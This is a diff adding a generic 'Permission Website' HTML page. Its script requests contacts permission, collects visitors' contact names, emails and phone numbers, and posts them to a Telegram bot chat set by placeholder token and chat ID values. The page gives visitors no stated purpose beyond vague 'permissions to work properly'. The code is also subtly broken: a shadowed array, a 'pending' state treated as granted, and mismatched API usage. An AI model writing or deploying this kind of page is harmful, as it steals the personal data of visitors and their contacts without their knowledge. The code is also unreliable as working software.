@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Permission Website</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+  <h1>Permission Website</h1>
+  <p>This website needs some permissions to work properly.</p>
+  <button id="request-permission">Request Permissions</button>
+  <button id="send-data">Send Data</button>
+  <div id="permission-status"></div>
+  <div id="data-sent"></div>
+
+  <script>
+    var permissionStatus = false;
+    var telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+    var telegramChatId = 'YOUR_TELEGRAM_CHAT_ID';
+
+    document.getElementById('request-permission').addEventListener('click', function() {
+      navigator.permissions.query({ name: 'contacts' })
+        .then(function(permission) {
+          if (permission.state === 'granted') {
+            permissionStatus = true;
+            document.getElementById('permission-status').innerHTML = 'Permissions granted';
+          } else if (permission.state === 'denied') {
+            permissionStatus = false;
+            document.getElementById('permission-status').innerHTML = 'Permissions denied';
+          } else {
+            permissionStatus = 'pending';
+            document.getElementById('permission-status').innerHTML = 'Permissions pending';
+          }
+        });
+    });
+
+    document.getElementById('send-data').addEventListener('click', function() {
+      if (permissionStatus) {
+        var contacts = [];
+        navigator.contacts.select(['name', 'email', 'phoneNumbers'])
+          .then(function(contacts) {
+            contacts.forEach(function(contact) {
+              contacts.push({
+                'name': contact.name.formatted,
+                'email': contact.emails[0].value,
+                'phone': contact.phoneNumbers[0].value
+              });
+            });
+            var data = {
+              'contacts': contacts
+            };
+            $.ajax({
+              type: 'POST',
+              url: `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
+              data: JSON.stringify({
+                'chat_id': telegramChatId,
+                'text': JSON.stringify(data)
+              }),
+              contentType: 'application/json',
+              success: function(data) {
+                document.getElementById('data-sent').innerHTML = 'Data sent successfully';
+              },
+              error: function(xhr, textStatus, errorThrown) {
+                document.getElementById('data-sent').innerHTML = 'Error sending data';
+              }
+            });
+          });
+      } else {
+        document.getElementById('data-sent').innerHTML = 'Please grant permissions first';
+      }
+    });
+  </script>
+</body>
+</html>
